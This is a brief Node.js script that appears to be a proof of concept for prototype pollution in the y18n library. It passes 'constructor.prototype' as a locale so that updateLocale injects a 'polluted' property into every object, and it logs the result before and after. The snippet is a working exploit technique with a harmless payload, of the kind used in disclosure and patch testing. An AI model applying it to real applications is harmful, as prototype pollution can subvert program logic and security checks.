var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const y18n = require('y18n')();
obj = {};
console.log({}.polluted);
y18n.setLocale('constructor.prototype');
y18n.updateLocale({ polluted: 'yes' });
console.log({}.polluted);